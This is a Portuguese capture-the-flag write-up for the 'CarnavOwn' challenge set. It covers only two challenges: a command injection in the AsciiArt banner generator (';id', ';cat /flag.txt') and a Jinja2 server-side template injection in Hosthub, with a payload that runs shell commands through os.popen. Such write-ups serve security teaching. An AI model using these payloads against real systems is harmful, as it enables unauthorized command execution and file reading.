# CarnavOwn

![CarnavOwn](/images/hackingclub-carnavown/file-carnavown-2026-1.png)

## Resumo

`CarnaOwn` é uma coleção de desafios diversos que vão desde exploração `web` e invasão de `binários` até `engenharia reversa` em dispositivos móveis e `descriptografia de ransomware`. Este artigo detalha as soluções para os seguintes desafios, com foco na compreensão das vulnerabilidades subjacentes e das técnicas de exploração.

- `AsciiArt` : Injeção de comandos em um backend que executa um shell.
- `Hosthub` : Injeção de modelo do lado do servidor (SSTI) em uma aplicação Jinja2.
- `EzyPwn` : Um clássico estouro de buffer baseado em pilha com vazamento de memória.
- `IdentityAPI` : Uma configuração incorreta de uma tag de estrutura em Golang que levou à atribuição em massa.
- `InstanceMetrics` : Contrabando de JSON devido a inconsistências no analisador sintático entre Go e Node.js.
- `Vault` : Confusão entre a análise de XML e JSON para forjar um JWT de administrador.
- `Marketplace` : Uma vulnerabilidade IDOR no endpoint de atualização do perfil do usuário.

# AsciiArt

## Análise

O aplicativo `AsciiArt` permite que os usuários gerem banners `ASCII` a partir de texto inserido. Ao analisar o comportamento, suspeitamos que o servidor possa estar usando uma ferramenta de linha de comando (como ascii figletou ascii toilet) para gerar essa arte.
Ao analisar a requisição, enviamos o texto no parâmetro `cmd`, para que possamos testar injeções nesse campo.

![Ascii](/images/hackingclub-carnavown/file-asciiart-2026-2.png)

Ao enviar a carga útil `;id` podemos confirmar uma injeção de comando.

![Command](/images/hackingclub-carnavown/file-asciiart-2026-3.png)

### Exploração

```bash
;ls -la /
```
![Command](/images/hackingclub-carnavown/file-asciiart-2026-4.png)

```bash
;cat /flag.txt
```
![Command](/images/hackingclub-carnavown/file-asciiart-2026-5.png)

# Hosthub

## Análise

Após realizarmos um scan no host com o Nmap, identificamos que o serviço `Werkzeug (Python)` está em execução na porta `5000`. Ao acessar essa porta pelo navegador, encontramos um site simples contendo um formulário “Fale Conosco”.

Ao enviar o formulário, foi possível observar que os dados inseridos — como, por exemplo, o `nome` — são refletidos diretamente na página de confirmação exibida ao usuário.

![Scan](/images/hackingclub-carnavown/file-hosthub-2026-1.png)
![Form](/images/hackingclub-carnavown/file-hosthub-2026-2.png)
![SSTI](/images/hackingclub-carnavown/file-hosthub-2026-3.png)

Essa reflexão sugere uma possível `Injeção de Template no Lado do Servidor (SSTI)`. Em aplicações web modernas, o HTML costuma ser gerado dinamicamente por meio de mecanismos de template, como Jinja2 no Python ou Twig no PHP.

Quando a entrada do usuário é concatenada diretamente na string do template, em vez de ser passada apenas como dados para o mecanismo de renderização, existe o risco de que o motor de template interprete e execute expressões inseridas pelo usuário.

Para verificar essa possibilidade, inserimos no campo do formulário uma expressão matemática utilizando a sintaxe típica de templates:

```bash
{{7*7}}
```

Se a aplicação estiver vulnerável a `SSTI`, o mecanismo de template interpretará essa expressão e retornará o resultado do cálculo `(49)` na página de resposta, em vez de exibir o texto literal. Isso confirmaria que a entrada do usuário está sendo processada diretamente pelo motor de templates.

![SSTI](/images/hackingclub-carnavown/file-hosthub-2026-4.png)

O servidor respondeu com: “Obrigado por entrar em contato conosco, `49`!”. A avaliação da expressão `7*7` como `49` confirma que o servidor está interpretando e executando nossa entrada como uma expressão de template `Jinja2`, em vez de tratá-la apenas como texto.

Esse comportamento evidencia que a aplicação está processando diretamente a entrada do usuário no mecanismo de templates, confirmando a presença de uma vulnerabilidade de `Server-Side Template Injection (SSTI)`.

### Exploração

Podemos então enviar uma payload `SSTI` simples com o objetivo de tentar ler o arquivo `/flag.txt` no servidor.

![Flag](/images/hackingclub-carnavown/file-hosthub-2026-5.png)

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

# Todos os desafios mencionados no resumo ainda não foram escritos. Aguarde as próximas publicações para acompanhar o conteúdo completo.